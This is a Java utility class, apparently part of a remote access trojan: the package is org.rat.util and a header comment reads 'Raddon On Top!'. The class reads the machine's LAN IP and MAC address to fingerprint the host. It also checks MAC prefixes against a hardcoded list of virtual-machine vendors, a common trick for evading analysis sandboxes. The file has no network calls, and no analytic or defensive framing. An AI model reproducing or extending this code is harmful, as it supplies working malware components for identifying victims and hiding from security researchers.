//Raddon On Top!

package org.rat.util;

import java.util.*;
import java.net.*;

public class MacUtil
{
    public static String getAddress() {
        String address = "";
        InetAddress lanIp = null;
        try {
            String ipAddress = null;
            Enumeration<NetworkInterface> net = null;
            net = NetworkInterface.getNetworkInterfaces();
            while (net.hasMoreElements()) {
                final NetworkInterface element = net.nextElement();
                final Enumeration<InetAddress> addresses = element.getInetAddresses();
                while (addresses.hasMoreElements() && !isVMMac(element.getHardwareAddress())) {
                    final InetAddress ip = addresses.nextElement();
                    if (ip instanceof Inet4Address && ip.isSiteLocalAddress()) {
                        ipAddress = ip.getHostAddress();
                        lanIp = InetAddress.getByName(ipAddress);
                    }
                }
            }
            if (lanIp == null) {
                return null;
            }
            address = getMacAddress(lanIp);
        }
        catch (Exception ex) {}
        return address;
    }
    
    private static String getMacAddress(final InetAddress ip) {
        String address = null;
        try {
            final NetworkInterface network = NetworkInterface.getByInetAddress(ip);
            final byte[] mac = network.getHardwareAddress();
            final StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; ++i) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }
            address = sb.toString();
        }
        catch (SocketException ex) {
            ex.printStackTrace();
        }
        return address;
    }
    
    public static boolean isVMMac(final byte[] mac) {
        if (null == mac) {
            return false;
        }
        final byte[][] array;
        final byte[][] invalidMacs = array = new byte[][] { { 0, 5, 105 }, { 0, 28, 20 }, { 0, 12, 41 }, { 0, 80, 86 }, { 8, 0, 39 }, { 10, 0, 39 }, { 0, 3, -1 }, { 0, 21, 93 } };
        for (final byte[] invalid : array) {
            if (invalid[0] == mac[0] && invalid[1] == mac[1] && invalid[2] == mac[2]) {
                return true;
            }
        }
        return false;
    }
}
